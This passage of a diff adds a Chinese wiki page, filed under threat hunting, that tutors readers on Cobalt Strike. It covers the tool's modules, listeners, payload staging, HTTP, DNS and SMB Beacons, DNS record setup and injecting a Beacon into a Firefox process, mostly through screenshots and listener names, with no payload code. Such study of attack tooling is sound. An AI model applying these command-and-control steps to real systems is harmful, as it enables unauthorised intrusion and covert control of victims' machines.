+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-威胁猎捕/Cobalt Strike/1-Cobalt-Strike基础上篇" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/">威胁猎捕</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/">Cobalt Strike</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Cobalt-Strike/" rel="tag">Cobalt Strike</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">
+            <time datetime="2021-07-03T03:35:03.000Z" itemprop="datePublished">2021-07-03</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/威胁猎捕/Cobalt Strike/1-Cobalt-Strike基础上篇.md"> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/威胁猎捕/Cobalt Strike/1-Cobalt-Strike基础上篇.md"> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/威胁猎捕/Cobalt Strike/1-Cobalt-Strike基础上篇.md"> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            1-Cobalt Strike基础上篇
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Cobalt-Strike-%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">1.Cobalt Strike 模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Cobalt-Strike-%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 Cobalt Strike 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-View-%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 View 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-Attacks-%E6%A8%A1%E5%9D%97"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 Attacks 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-Reporting%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 Reporting模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="toc-number">2.</span> <span class="toc-text">2.基础设施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E7%9B%91%E5%90%AC%E5%99%A8%E7%AE%A1%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 监听器管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-HTTP-Beacon%E5%92%8CHTTPS-Beacon"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 HTTP Beacon和HTTPS Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-DNS-Beacon"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 DNS Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-SMB-Beacon"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 SMB Beacon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E9%87%8D%E5%AE%9A%E5%90%91%E5%99%A8"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 重定向器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 攻击载荷安全特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%9B%AE%E6%A0%87%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">3.目标攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 客户端攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E7%B3%BB%E7%BB%9F%E4%BE%A6%E5%AF%9F-System-Profiler"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 系统侦察 System Profiler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E7%94%A8%E6%88%B7%E9%A9%B1%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 用户驱动攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-1-hta%E5%90%8E%E9%97%A8"><span class="toc-number">3.3.1.</span> <span class="toc-text">3.3.1 hta后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-2-%E5%AE%8F%E7%97%85%E6%AF%92"><span class="toc-number">3.3.2.</span> <span class="toc-text">3.3.2 宏病毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-3-Payload-Generator"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.3.3 Payload Generator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-4-Windows-Executable"><span class="toc-number">3.3.4.</span> <span class="toc-text">3.3.4 Windows Executable</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-5-Windows-Executable%EF%BC%88S%EF%BC%89"><span class="toc-number">3.3.5.</span> <span class="toc-text">3.3.5 Windows Executable（S）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E7%94%A8%E6%88%B7%E9%A9%B1%E5%8A%A8%E7%9A%84Web%E4%BA%A4%E4%BB%98%E6%94%BB%E5%87%BB"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 用户驱动的Web交付攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E9%92%93%E9%B1%BC%E6%A8%A1%E5%9D%97"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 钓鱼模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-1-Manage"><span class="toc-number">3.5.1.</span> <span class="toc-text">3.5.1 Manage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-2-System-Profiler"><span class="toc-number">3.5.2.</span> <span class="toc-text">3.5.2 System Profiler</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-3-Clone-Site"><span class="toc-number">3.5.3.</span> <span class="toc-text">3.5.3 Clone Site</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-4-Host-File"><span class="toc-number">3.5.4.</span> <span class="toc-text">3.5.4 Host File</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-5-Clone-Site-Host-File"><span class="toc-number">3.5.5.</span> <span class="toc-text">3.5.5 Clone Site + Host File</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-6-Clone-Site-MSF"><span class="toc-number">3.5.6.</span> <span class="toc-text">3.5.6 Clone Site + MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-7-Spear-Phish"><span class="toc-number">3.5.7.</span> <span class="toc-text">3.5.7 Spear Phish</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5-8-Scripted-Web-Delivery%EF%BC%88S%EF%BC%89"><span class="toc-number">3.5.8.</span> <span class="toc-text">3.5.8 Scripted Web Delivery（S）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
+                </div>
+            
+        
+        
+            <p>[TOC]</p>
+<p><strong>by Tahir 2021.6.8</strong></p>
+<h2 id="1-Cobalt-Strike-模块详解"><a href="#1-Cobalt-Strike-模块详解" class="headerlink" title="1.Cobalt Strike 模块详解"></a>1.Cobalt Strike 模块详解</h2><h3 id="1-1-Cobalt-Strike-模块"><a href="#1-1-Cobalt-Strike-模块" class="headerlink" title="1.1 Cobalt Strike 模块"></a>1.1 Cobalt Strike 模块</h3><p>Cobalt Strike 模块的功能选项，如下图。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/1.png"></p>
+<ul>
+<li>New Connection：打开一个新的”Connect”窗口。在当前窗口中新建一个连接，即可同时连接不同的团队服务器( 便于团队之间的协作)。</li>
+<li>Preferences：偏好设置，首选项，用于设置Cobalt Strike主界面、控制台、TeamServer 连接记录、报告的样式。</li>
+<li>Visualization：将主机以不同的权限展示出来（主要以输出结果的形式展示）。</li>
+<li>VPN Interfaces：设置VPN接口。</li>
+<li>Listeners：创建监听器。</li>
+<li>Script Manager：查看和加载CNA脚本。</li>
+<li>Close：关闭当前与TeamServer的连接。</li>
+</ul>
+<h3 id="1-2-View-模块"><a href="#1-2-View-模块" class="headerlink" title="1.2 View 模块"></a>1.2 View 模块</h3><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/2.png"></p>
+<ul>
+<li>Applications：显示被控机器的应用信息。</li>
+<li>Credentials：通过HashDump或mimikatz获取的密码或者散列值都储存在这里。</li>
+<li>Downloads：从被控机器中下载的文件。</li>
+<li>Event Log：主机上线记录，以及与团队协作相关的聊天记录和操作记录。</li>
+<li>Keystrokes：键盘记录。</li>
+<li>Proxy Pivots：代理模块。</li>
+<li>Screenshots：屏幕截图模块。</li>
+<li>Script Console：控制台，在这里可以加载各种脚本。（链接）</li>
+<li>Targets：显示目标。</li>
+<li>Web Log：Web 访问日志。</li>
+</ul>
+<h3 id="1-3-Attacks-模块"><a href="#1-3-Attacks-模块" class="headerlink" title="1.3 Attacks 模块"></a>1.3 Attacks 模块</h3><p>下面介绍Attacks模块下的Packages 和 Web Drive-by 模块。</p>
+<p><strong>1.Packages模块</strong></p>
+<p>依次单击 “Attacks” → “Packages” 选项，可以看到一系列功能模块，如下图。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/3.png"></p>
+<ul>
+<li>HTML Application：基于HTML应用的Payload模块，通过HTML调用其他语言的应用组件进行攻击测试，提供了可执行文件、PowerShell、 VBA三种方法。</li>
+<li>MS Office Macro：生成基于Office病毒的Payload 模块。</li>
+<li>Payload Generator：Payload 生成器，可以生成基于C、C#、COM Scriptlet、 Java、 Perl、 PowerShell、Python、 Ruby、 VBA等的Payload。</li>
+<li>USB/CD AutoPlay：用于生成利用自动播放功能运行的后门文件。</li>
+<li>Windows Dropper：捆绑器，能够对文档进行捆绑并执行Payload。</li>
+<li>Windows Executable：可以生成32位或64位的EXE和基于服务的EXE、DLL等后门程序。在32位的Windows操作系统中无法执行64位的Payload, 而且对于后渗透测试的相关模块，使用32位和64位的Payload会产生不同的影响，因此在使用时应谨慎选择。</li>
+<li>Windows Executable (S)：用于生成一个Windows 可执行文件，其中包含Beacon的完整Payload,不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持PowerShell脚本，可用于将Stageless Payload注入内存。</li>
+</ul>
+<p><strong>2.Web Drive-by 模块</strong></p>
+<p>依次单击 “Attacks” → “Web Drive-by” 选项，可以看到一系列基于网络驱动的功能模块，如下图。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/4.png"></p>
+<ul>
+<li>Manage：管理器，用于对TeamServer上已经开启的Web服务进行管理，包括 Listener 及 Web Delivery模块。</li>
+<li>Clone Site：用于克隆指定网站的样式。</li>
+<li>Host File：用于将指定文件加载到Web目录中，支持修改Mime Type。</li>
+<li>Script Web Delivery：基于Web的攻击测试脚本，自动生成可执行的Payload。</li>
+<li>Signed Applet Attack：使用Java自签名的程序进行钓鱼攻击测试。如果用户有Applet 运行权限，就会执行其中的恶意代码。</li>
+<li>Smart Applet Attack：自动检测Java的版本并进行跨平台和跨浏览器的攻击测试。该模块使用嵌入式漏洞来禁用Java的安全沙盒。可利用此漏洞的Java版本为1.6.0_45以下及1.7.0 _21以下。</li>
+<li>System Profiler：客户端检测工具，可以用来获取一些系统信息，例如系统版本、浏览器版本、Flash版本等。</li>
+</ul>
+<h3 id="1-4-Reporting模块"><a href="#1-4-Reporting模块" class="headerlink" title="1.4 Reporting模块"></a>1.4 Reporting模块</h3><p>Reporting模块可以配合Cobalt Strike的操作记录、结果等，直接生成相关报告，如下图。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/5.png"></p>
+<ul>
+<li>Activity report：活动报告生成。</li>
+<li>Hosts report：主机报告。</li>
+<li>Indicators of Compromise：目标报告。</li>
+<li>Sessions Report：会话报告。</li>
+<li>Social Engineering Peport：社会工程学报告。</li>
+<li>Tactics, Techniques, and Procedures：战术技术过程，TTPs。</li>
+<li>Reset Data：重置数据。</li>
+<li>Export data：数据出口。</li>
+</ul>
+<h2 id="2-基础设施"><a href="#2-基础设施" class="headerlink" title="2.基础设施"></a>2.基础设施</h2><p>任何行动的第一步都是建立基础设施。就 Cobalt Strike 而言，基础设施由一个或多个团队服务器、重定向器以及指向你的团队服务器和重定向器的 DNS 记录组成。一旦团队服务器启动并运行，你将需要连接到它并将其配置为接收来自受害系统的连接。监听器就是 Cobalt Strike 中用来执行这种任务的机制。</p>
+<h3 id="2-1-监听器管理"><a href="#2-1-监听器管理" class="headerlink" title="2.1 监听器管理"></a>2.1 监听器管理</h3><ul>
+<li><p>什么是监听器</p>
+<p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p>
+</li>
+<li><p>监听器的作用</p>
+<p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p>
+<p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p>
+</li>
+</ul>
+<p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。</p>
+<p>一个监听器既是一个 payload 的配置信息，同时又是 Cobalt Strike 起一个服务器来接收来自这个payload 的连接的指示。一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。 </p>
+<p>监听器的名字一般由以下结构组成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OperatingSystem/Payload/Stager</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure>
+
+<p><strong>什么是传输器</strong></p>
+<p>payload staging（分阶段传送 payload）。在很多攻击框架的设计中，解耦了攻击和攻击执行的内容。payload 就是攻击执行的内容。payload 通常被分为两部分：payload stage 和 payload stager。</p>
+<p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p>
+<p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p>
+<p>stager 是一个小程序，通常是手工优化的汇编指令，用于下载一个payload stage、把它注入内存，然后对其传达执行命令。这个过程被称为 staging（分阶段）。<br>staging（分阶段）过程在一些攻击行动中是必要的。很多攻击中对于能加载进内存并在成功漏洞利用后执行的数据大小存在严格限制。这会极大地限制你的后渗透选择，除非你分阶段传送你的后渗透payload。Cobalt Strike 在它的用户驱动攻击中使用 staging（分阶段）。大多数这类项目Attacks → Packages 和 Attacks → Web Drive-by 选项下。使用什么样的 stager 取决于与攻击配对的 payload。比如，HTTP Beacon 有一个 HTTP stager。DNS Beacon 有一个 DNS TXT 记录 stager。不是所有的 payload 都有 stager 选项。</p>
+<p>没有 stager 的 Payload 不能使用这些攻击选项投递。如果你不需要 payload staging（分阶段），通过在你的 C2 拓展文件里把 host_stage 选项设为false，你可以关闭这个选项。这会阻止 Cobalt Strike 在其 web 和 DNS 服务器上托管 payloadstage。这种设置有助于提升行为安全（避免反溯源），因为如果开启了 staging（分阶段），任何人都能连到你的服务器上，请求一个 payload、并分析它的内容，从而可以从你的 payload 配置中获取信息。  </p>
+<p><strong>创建监听器</strong></p>
+<p>要管理 Cobalt Strike 的监听器，通过 Cobalt Strike → Listeners 。这会打开一个标签页，列举出所有你的配置的 payload 和监听器。  </p>
+<p>在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。</p>
+<p>Cobalt Strike有两种类型的监听器：</p>
+<ul>
+<li>Beacon</li>
+</ul>
+<p>Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Foreign</li>
+</ul>
+<p>Foreign直译就是外部的，这里可以理解成对外监听器，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/foreign/reverse_https</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-HTTP-Beacon和HTTPS-Beacon"><a href="#2-2-HTTP-Beacon和HTTPS-Beacon" class="headerlink" title="2.2 HTTP Beacon和HTTPS Beacon"></a>2.2 HTTP Beacon和HTTPS Beacon</h3><p><strong>Beacon是什么</strong></p>
+<ul>
+<li>Beacon是CS的Payload</li>
+<li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li>
+<li>通过HTTP、HTTPS和DNS出口网络</li>
+<li>使用SMB协议的时候是点对点通信</li>
+<li>Beacon有很多的后渗透攻击模块和远程管理工具</li>
+</ul>
+<p><strong>Beacon的类型</strong></p>
+<ul>
+<li>HTTP 和 HTTPS Beacon</li>
+</ul>
+<p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DNS Beacon</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_dns/reverse_dns_txt</span><br><span class="line">windows/beacon_dns/reverse_http</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>SMB Beacon</li>
+</ul>
+<p>SMB Beacon也可以叫做pipe beacon</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_smb/bind_pipe</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建一个HTTP Beacon</strong></p>
+<p>点击 Cobalt Strike –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save</p>
+<p>此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch。基础篇有详细步骤介绍。</p>
+<p><strong>HTTPS Beacon</strong></p>
+<p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p>
+<h3 id="2-3-DNS-Beacon"><a href="#2-3-DNS-Beacon" class="headerlink" title="2.3 DNS Beacon"></a>2.3 DNS Beacon</h3><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p>
+<p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p>
+<p>DNS Beacon的工作流程具体如下：</p>
+<p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器stager嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器stager回连下载CS服务器上的DNS Beacon传输体stage，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p>
+<p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p>
+<p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p>
+<p><strong>域名配置</strong></p>
+<p>既然是配置域名，所以就需要先有个域名，这里就用一个博客域名作为示例：添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/6.png"></p>
+<p>添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/7.png"></p>
+<p>根据基础篇的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/8.png"></p>
+<p>然后经过一段时间的等待，就可以发现已经上线了</p>
+<img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/9.png" style="zoom:50%;">
+
+<h3 id="2-4-SMB-Beacon"><a href="#2-4-SMB-Beacon" class="headerlink" title="2.4 SMB Beacon"></a>2.4 SMB Beacon</h3><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。</p>
+<img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/10.png" style="zoom:67%;">
+
+
+
+<p>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效（系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败）.</p>
+<p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p>
+<p>SMB Beacon 配置</p>
+<p>首先需要一个上线的主机，这里我使用的HTTP Beacon，主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/11.png"></p>
+<p>接下来在Beacon中直接输入spawn SMB，这里的SMB指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/12.png"></p>
+<p>等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个∞∞字符。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/13.png"></p>
+<p>接下来我这里将SMB Beacon插入到进程中，以firefox进程为例。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/14.png"></p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/15.png"></p>
+<p>在firefox中插入SMB Beacon后，便能看到process为firefox的派生SMB Beacon。</p>
+<p>在CS中，如果获取到目标的管理员权限，在用户名后会有*号标注。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/16.png"></p>
